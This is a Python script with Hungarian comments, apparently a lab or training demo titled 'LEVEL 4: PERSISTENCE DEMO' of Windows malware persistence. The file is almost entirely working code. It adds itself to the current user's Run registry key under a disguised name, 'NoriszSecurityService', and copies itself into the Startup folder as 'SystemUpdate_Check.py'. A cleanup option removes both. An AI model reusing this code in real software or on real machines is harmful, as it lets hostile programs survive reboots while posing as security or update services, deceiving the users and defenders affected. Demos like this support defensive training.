import winreg as reg
import os
import shutil
import sys

class PersistenceManager:
    def __init__(self, payload_path):
        """
        :param payload_path: A fájl teljes elérési útja, amit állandósítani akarunk.
        """
        self.payload_path = payload_path
        self.app_name = "NoriszSecurityService"  # Álcázott név a Registry-ben

    def add_registry_persistence(self):
        """
        1. Technika: Windows Registry (HKCU Run Key)
        Ez a leggyakoribb módszer. A program beírja magát az aktuális felhasználó
        automatikus indítási kulcsai közé.
        """
        try:
            # A kulcs megnyitása írásra
            key = reg.OpenKey(
                reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                reg.KEY_SET_VALUE
            )
            
            # Az érték beírása (Név: Útvonal)
            reg.SetValueEx(key, self.app_name, 0, reg.REG_SZ, self.payload_path)
            reg.CloseKey(key)
            print(f"[+] SIKER: Registry kulcs létrehozva: {self.app_name}")
            return True
        except Exception as e:
            print(f"[-] HIBA (Registry): {e}")
            return False

    def add_startup_folder_persistence(self):
        """
        2. Technika: Startup Folder (Indítópult)
        A Windows minden fájlt elindít, ami ebben a mappában van bejelentkezéskor.
        """
        try:
            # Megkeressük a Startup mappát
            startup_dir = os.path.join(
                os.getenv('APPDATA'),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            
            # A célfájl neve
            destination = os.path.join(startup_dir, "SystemUpdate_Check.py")
            
            # Átmásoljuk magunkat oda (vagy létrehozunk egy parancsikont)
            shutil.copy(self.payload_path, destination)
            
            print(f"[+] SIKER: Fájl bemásolva az Indítópultba: {destination}")
            return True
        except Exception as e:
            print(f"[-] HIBA (Startup Folder): {e}")
            return False

    def remove_persistence(self):
        """
        Takarítás: A teszt után töröljük a nyomokat.
        """
        print("\n[*] Takarítás indítása...")
        
        # 1. Registry törlés
        try:
            key = reg.OpenKey(
                reg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, reg.KEY_SET_VALUE
            )
            reg.DeleteValue(key, self.app_name)
            reg.CloseKey(key)
            print("[+] Registry kulcs törölve.")
        except FileNotFoundError:
            print("[!] Registry kulcs nem volt ott.")
        except Exception as e:
            print(f"[-] Registry hiba: {e}")

        # 2. Startup fájl törlés
        try:
            startup_file = os.path.join(
                os.getenv('APPDATA'),
                r"Microsoft\Windows\Start Menu\Programs\Startup",
                "SystemUpdate_Check.py"
            )
            if os.path.exists(startup_file):
                os.remove(startup_file)
                print("[+] Startup fájl törölve.")
            else:
                print("[!] Startup fájl nem volt ott.")
        except Exception as e:
            print(f"[-] Startup hiba: {e}")

# --- FŐ PROGRAM ---
if __name__ == "__main__":
    # A jelenleg futó script útvonala
    current_file = os.path.abspath(sys.argv[0])
    
    manager = PersistenceManager(current_file)

    print("--- LEVEL 4: PERSISTENCE DEMO ---")
    print("1. Perzisztencia telepítése (Install)")
    print("2. Nyomok eltüntetése (Cleanup)")
    
    choice = input("\nVálassz (1/2): ")
    
    if choice == "1":
        print("\n[*] Telepítés folyamatban...")
        manager.add_registry_persistence()
        manager.add_startup_folder_persistence()
        print("\n[INFO] Ellenőrizd a Feladatkezelőt (Indítás fül) vagy a Registry-t!")
    elif choice == "2":
        manager.remove_persistence()
    else:
        print("Érvénytelen választás.")